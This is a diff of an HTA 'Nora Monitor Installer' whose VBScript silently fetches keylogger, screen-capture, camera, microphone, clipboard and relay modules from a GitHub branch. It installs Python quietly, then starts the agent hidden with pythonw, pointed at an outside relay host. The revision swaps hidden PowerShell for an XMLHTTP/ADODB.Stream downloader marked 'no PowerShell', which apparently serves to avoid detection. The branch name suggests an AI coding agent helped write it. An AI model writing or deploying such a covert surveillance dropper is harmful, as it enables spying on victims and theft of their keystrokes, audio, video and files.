@@ -21,106 +21,49 @@
     font-family:Consolas,monospace;
     display:flex; flex-direction:column;
     align-items:center; justify-content:center;
-    height:100vh; overflow:hidden;
-    user-select:none;
+    height:100vh; overflow:hidden; user-select:none;
   }
-
-  #logo {
-    font-size:22px; letter-spacing:6px; color:#7c6aff;
-    text-transform:uppercase; margin-bottom:6px; font-weight:bold;
-  }
+  #logo { font-size:22px; letter-spacing:6px; color:#7c6aff; text-transform:uppercase; margin-bottom:6px; font-weight:bold; }
   #tagline { font-size:11px; color:#444; letter-spacing:2px; margin-bottom:40px; }
 
   .ring-wrap { position:relative; width:80px; height:80px; margin-bottom:32px; }
-  .ring {
-    position:absolute; top:0; left:0;
-    width:80px; height:80px;
-    border:3px solid #1a1a1a;
-    border-top:3px solid #7c6aff;
-    border-radius:50%;
-    animation:spin 0.9s linear infinite;
-  }
-  .ring2 {
-    position:absolute; top:10px; left:10px;
-    width:60px; height:60px;
-    border:3px solid #1a1a1a;
-    border-bottom:3px solid #a78bfa;
-    border-radius:50%;
-    animation:spin 1.3s linear infinite reverse;
-  }
-  .ring-icon {
-    position:absolute; top:50%; left:50%;
-    transform:translate(-50%,-50%);
-    font-size:22px; line-height:1;
-  }
+  .ring  { position:absolute; top:0; left:0; width:80px; height:80px; border:3px solid #1a1a1a; border-top:3px solid #7c6aff; border-radius:50%; animation:spin 0.9s linear infinite; }
+  .ring2 { position:absolute; top:10px; left:10px; width:60px; height:60px; border:3px solid #1a1a1a; border-bottom:3px solid #a78bfa; border-radius:50%; animation:spin 1.3s linear infinite reverse; }
+  .ring-icon { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:22px; }
 
-  @keyframes spin {
-    0%   { transform:rotate(0deg); }
-    100% { transform:rotate(360deg); }
-  }
+  @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
 
-  #status-label {
-    font-size:13px; color:#aaa; margin-bottom:10px;
-    min-height:18px; text-align:center;
-  }
-  #step-detail {
-    font-size:10px; color:#444; margin-bottom:28px;
-    text-align:center; min-height:14px;
-  }
+  #status-label { font-size:13px; color:#aaa; margin-bottom:8px; min-height:18px; text-align:center; }
+  #step-detail  { font-size:10px; color:#555; margin-bottom:28px; text-align:center; min-height:14px; }
 
-  #steps {
-    display:flex; flex-direction:column; gap:7px;
-    width:260px;
-  }
-  .step {
-    display:flex; align-items:center; gap:10px;
-    font-size:11px; color:#333;
-    transition:color 0.3s;
-  }
+  #steps { display:flex; flex-direction:column; gap:7px; width:260px; }
+  .step  { display:flex; align-items:center; gap:10px; font-size:11px; color:#333; }
   .step.done   { color:#4ade80; }
   .step.active { color:#e0e0e0; }
   .step.error  { color:#f87171; }
-  .step-dot {
-    width:8px; height:8px; border-radius:50%;
-    background:#222; flex-shrink:0;
-    transition:background 0.3s;
-  }
+  .step-dot { width:8px; height:8px; border-radius:50%; background:#222; flex-shrink:0; }
   .step.done   .step-dot { background:#4ade80; }
   .step.active .step-dot { background:#7c6aff; animation:pulse 1s infinite; }
   .step.error  .step-dot { background:#f87171; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
 
-  @keyframes pulse {
-    0%,100% { opacity:1; } 50% { opacity:0.3; }
-  }
-
-  #done-msg {
-    display:none; text-align:center; margin-top:20px;
-  }
+  #done-msg { display:none; text-align:center; margin-top:20px; }
   #done-msg .tick { font-size:36px; color:#4ade80; display:block; margin-bottom:8px; }
   #done-msg p { font-size:12px; color:#666; }
-  #close-btn {
-    margin-top:16px; padding:7px 24px;
-    background:#7c6aff; border:none; color:#fff;
-    border-radius:6px; font-size:12px; font-family:Consolas,monospace;
-    cursor:pointer; letter-spacing:1px;
-  }
+  #close-btn { margin-top:16px; padding:7px 24px; background:#7c6aff; border:none; color:#fff; border-radius:6px; font-size:12px; font-family:Consolas,monospace; cursor:pointer; letter-spacing:1px; }
   #close-btn:hover { background:#6d5ce7; }
 </style>
 </head>
 <body onload="init()">
-
 <div id="logo">NORA</div>
 <div id="tagline">Monitor Installer</div>
-
 <div class="ring-wrap" id="spinner">
   <div class="ring"></div>
   <div class="ring2"></div>
-  <span class="ring-icon">⚡</span>
+  <span class="ring-icon">&#9889;</span>
 </div>
-
-<div id="status-label">Initializing…</div>
+<div id="status-label">Initializing&#8230;</div>
 <div id="step-detail">&nbsp;</div>
-
 <div id="steps">
   <div class="step" id="s0"><div class="step-dot"></div>Create directories</div>
   <div class="step" id="s1"><div class="step-dot"></div>Download files</div>
@@ -128,119 +71,120 @@
   <div class="step" id="s3"><div class="step-dot"></div>Install dependencies</div>
   <div class="step" id="s4"><div class="step-dot"></div>Launch agent</div>
 </div>
-
 <div id="done-msg">
-  <span class="tick">✓</span>
+  <span class="tick">&#10003;</span>
   <p>Nora Monitor is running in the background.</p>
   <button id="close-btn" onclick="window.close()">Close</button>
 </div>
 
 <script language="VBScript">
-Dim sh, fs
+Dim sh, fs, DIR, RAW
 
 Sub init()
-  Set sh = CreateObject("WScript.Shell")
-  Set fs = CreateObject("Scripting.FileSystemObject")
-  window.resizeTo 360, 480
-  Call CenterWindow()
-  Call RunStep0()
-End Sub
-
-Sub CenterWindow()
-  Dim sw, sh2
-  sw = screen.width  : sh2 = screen.height
-  window.moveTo (sw - 360) / 2, (sh2 - 480) / 2
-End Sub
-
-Function DIR()
+  Set sh  = CreateObject("WScript.Shell")
+  Set fs  = CreateObject("Scripting.FileSystemObject")
   DIR = sh.ExpandEnvironmentStrings("%APPDATA%") & "\NoraMonitor"
+  RAW = "https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"
+  window.resizeTo 360, 480
+  window.moveTo (screen.width-360)\2, (screen.height-480)\2
+  window.setTimeout "Step0()", 200
+End Sub
+
+Sub SetStep(i, state)
+  document.getElementById("s"&i).className = "step " & state
+End Sub
+Sub Status(msg, detail)
+  document.getElementById("status-label").innerText = msg
+  document.getElementById("step-detail").innerText  = detail
+End Sub
+
+' Download any file (binary-safe) using XMLHTTP + ADODB.Stream — no PowerShell
+Function Download(url, dest)
+  On Error Resume Next
+  Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
+  http.Open "GET", url, False
+  http.Send
+  If http.Status = 200 Then
+    Dim st : Set st = CreateObject("ADODB.Stream")
+    st.Open : st.Type = 1
+    st.Write http.ResponseBody
+    st.SaveToFile dest, 2
+    st.Close
+    Download = True
+  Else
+    Download = False
+  End If
+  On Error GoTo 0
 End Function
 
-Sub SetStep(idx, state)
-  Dim el
-  Set el = document.getElementById("s" & idx)
-  el.className = "step " & state
-End Sub
-
-Sub SetStatus(msg, detail)
-  document.getElementById("status-label").innerText = msg
-  document.getElementById("step-detail").innerText = detail
-End Sub
-
-Sub RunPS(cmd)
-  sh.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command """ & cmd & """", 0, True
-End Sub
-
-' ── Step 0: Create dirs ───────────────────────────────────────────────────────
-Sub RunStep0()
-  SetStep 0, "active"
-  SetStatus "Creating directories…", DIR()
-  If Not fs.FolderExists(DIR()) Then fs.CreateFolder(DIR())
-  If Not fs.FolderExists(DIR() & "\templates") Then fs.CreateFolder(DIR() & "\templates")
-  If Not fs.FolderExists(DIR() & "\recordings") Then fs.CreateFolder(DIR() & "\recordings")
+' ── Step 0: directories ──────────────────────────────────────────────────────
+Sub Step0()
+  SetStep 0, "active" : Status "Creating directories...", DIR
+  If Not fs.FolderExists(DIR)               Then fs.CreateFolder DIR
+  If Not fs.FolderExists(DIR & "\templates") Then fs.CreateFolder DIR & "\templates"
+  If Not fs.FolderExists(DIR & "\recordings") Then fs.CreateFolder DIR & "\recordings"
   SetStep 0, "done"
-  window.setTimeout "RunStep1()", 300
+  window.setTimeout "Step1()", 300
 End Sub
 
-' ── Step 1: Download files ────────────────────────────────────────────────────
-Sub RunStep1()
-  SetStep 1, "active"
-  SetStatus "Downloading files…", "From GitHub"
-  Dim raw, files, d, ps
-  raw   = "https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"
-  files = "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','file_manager.py','microphone.py','requirements.txt'"
-  d     = DIR()
-  ps    = "$ProgressPreference='SilentlyContinue'; $r='" & raw & "'; $d='" & d & "';" & _
-          files & " -split ',' | %{ try { Invoke-WebRequest ""$r/$_"" -OutFile ""$d\$_"" -EA Stop } catch {} };" & _
-          "try { Invoke-WebRequest ""$r/templates/viewer.html"" -OutFile ""$d\templates\viewer.html"" -EA Stop } catch {}"
-  RunPS ps
+' ── Step 1: download files ───────────────────────────────────────────────────
+Sub Step1()
+  SetStep 1, "active" : Status "Downloading files...", "From GitHub"
+  Dim files, f
+  files = Array("app.py","keylogger.py","screencap.py","controller.py","server.py", _
+                "recorder.py","camera.py","clipboard_monitor.py","processes.py", _
+                "relay_client.py","file_manager.py","microphone.py","requirements.txt")
+  For Each f In files
+    Status "Downloading " & f & "...", RAW
+    Download RAW & "/" & f, DIR & "\" & f
+  Next
+  Download RAW & "/templates/viewer.html", DIR & "\templates\viewer.html"
   SetStep 1, "done"
-  window.setTimeout "RunStep2()", 300
+  window.setTimeout "Step2()", 300
 End Sub
 
-' ── Step 2: Check / install Python ───────────────────────────────────────────
-Sub RunStep2()
-  SetStep 2, "active"
-  SetStatus "Checking Python…", ""
+' ── Step 2: check Python ─────────────────────────────────────────────────────
+Sub Step2()
+  SetStep 2, "active" : Status "Checking Python...", ""
   Dim ret
-  ret = sh.Run("python --version", 0, True)
+  ret = sh.Run("cmd /c python --version", 0, True)
   If ret <> 0 Then
-    SetStatus "Installing Python 3.11…", "This may take a minute"
-    RunPS "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile ""$env:TEMP\pysetup.exe""; Start-Process ""$env:TEMP\pysetup.exe"" '/quiet InstallAllUsers=0 PrependPath=1' -Wait"
+    Status "Installing Python 3.11...", "Please wait, this may take a minute"
+    Dim tmp : tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\pysetup.exe"
+    Download "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", tmp
+    sh.Run """" & tmp & """ /quiet InstallAllUsers=0 PrependPath=1", 0, True
   End If
   SetStep 2, "done"
-  window.setTimeout "RunStep3()", 300
+  window.setTimeout "Step3()", 300
 End Sub
 
-' ── Step 3: pip install ───────────────────────────────────────────────────────
-Sub RunStep3()
-  SetStep 3, "active"
-  SetStatus "Installing dependencies…", "pip install -r requirements.txt"
-  Dim d, ps
-  d  = DIR()
-  ps = "$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User');" & _
-       "pip install -r """ & d & "\requirements.txt"" -q --no-warn-script-location"
-  RunPS ps
+' ── Step 3: pip install ──────────────────────────────────────────────────────
+Sub Step3()
+  SetStep 3, "active" : Status "Installing dependencies...", "pip install"
+  ' Refresh PATH from registry so freshly-installed Python is found
+  Dim syspath, userpath, newpath
+  On Error Resume Next
+  syspath  = sh.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path")
+  userpath = sh.RegRead("HKEY_CURRENT_USER\Environment\Path")
+  On Error GoTo 0
+  newpath = syspath & ";" & userpath
+  sh.Environment("Process")("PATH") = newpath
+  sh.Run "cmd /c pip install -r """ & DIR & "\requirements.txt"" -q --no-warn-script-location", 0, True
   SetStep 3, "done"
-  window.setTimeout "RunStep4()", 300
+  window.setTimeout "Step4()", 300
 End Sub
 
-' ── Step 4: Launch ───────────────────────────────────────────────────────────
-Sub RunStep4()
-  SetStep 4, "active"
-  SetStatus "Launching agent…", ""
-  Dim d, ps
-  d  = DIR()
-  ps = "$env:NORA_RELAY='https://mon.eclipselivecam.online';" & _
-       "$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User');" & _
-       "Start-Process pythonw """ & d & "\app.py"" -WorkingDirectory """ & d & """"
-  RunPS ps
+' ── Step 4: launch ───────────────────────────────────────────────────────────
+Sub Step4()
+  SetStep 4, "active" : Status "Launching agent...", ""
+  sh.Environment("Process")("NORA_RELAY") = "https://mon.eclipselivecam.online"
+  sh.Run "cmd /c start """" /D """ & DIR & """ pythonw """ & DIR & "\app.py""", 0, False
   SetStep 4, "done"
-  window.setTimeout "ShowDone()", 400
+  window.setTimeout "Done()", 400
 End Sub
 
-Sub ShowDone()
-  SetStatus "All done!", ""
+Sub Done()
+  Status "All done!", ""
   document.getElementById("spinner").style.display = "none"
   document.getElementById("done-msg").style.display = "block"
 End Sub
